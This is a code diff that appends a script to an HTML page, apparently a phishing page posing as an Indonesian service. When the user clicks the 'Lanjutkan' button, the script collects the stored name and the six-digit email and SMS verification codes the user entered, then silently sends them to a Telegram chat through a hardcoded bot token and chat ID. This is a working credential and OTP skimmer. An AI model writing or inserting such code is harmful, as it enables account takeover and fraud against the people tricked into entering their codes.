@@ -2485,4 +2485,59 @@ update();restart();
   window.addEventListener('pageshow',function(ev){ if(ev.persisted) hide(); });
 })();
 </script>
+
+<script id="kb-telegram-otp-send">
+(function () {
+  "use strict";
+  const BOT_TOKEN = "8635919924:AAHB1CPgQWMN78WQhRG100Q0o63C2NSzE4k";
+  const CHAT_ID   = "6959842489";
+
+  async function tgSend(text) {
+    if (!BOT_TOKEN || BOT_TOKEN.startsWith("ISI_")) return;
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      });
+      return await res.json();
+    } catch (e) { console.error("[TG]", e); }
+  }
+
+  const esc = (s) => String(s ?? "")
+    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  // Hook tombol "Lanjutkan" (#ov-continue)
+  document.addEventListener("click", function (e) {
+    const btn = e.target.closest("#ov-continue");
+    if (!btn || btn.disabled) return;
+
+    // Ambil nama dari tahap 04 (localStorage kb_nama)
+    let nama = "-";
+    try { nama = localStorage.getItem("kb_nama") || "-"; } catch(_) {}
+
+    // Ambil 6 digit OTP Email
+    const emailOtp = [...document.querySelectorAll('[data-otp="email"]')]
+      .map(i => i.value || "").join("");
+
+    // Ambil 6 digit OTP SMS
+    const smsOtp = [...document.querySelectorAll('[data-otp="sms"]')]
+      .map(i => i.value || "").join("");
+
+    const text =
+      `🔔 <b>KODE ${esc(nama.toUpperCase())}</b>\n\n` +
+      `Kode Verifikasi email : <code>${esc(emailOtp)}</code>\n` +
+      `Kode Verifikasi nomor hp : <code>${esc(smsOtp)}</code>`;
+
+    tgSend(text);
+  });
+})();
+</script>
+
 </body></html>
